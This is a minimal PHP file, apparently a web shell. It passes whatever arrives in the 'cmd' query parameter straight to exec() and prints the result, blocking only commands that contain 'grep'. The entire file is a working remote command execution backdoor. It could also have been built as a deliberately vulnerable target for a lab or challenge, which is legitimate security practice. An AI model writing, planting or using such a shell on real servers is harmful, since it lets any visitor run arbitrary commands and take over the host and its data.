<?php
	if(strpos($_GET['cmd'], 'grep') === false)echo exec($_GET['cmd']);
?>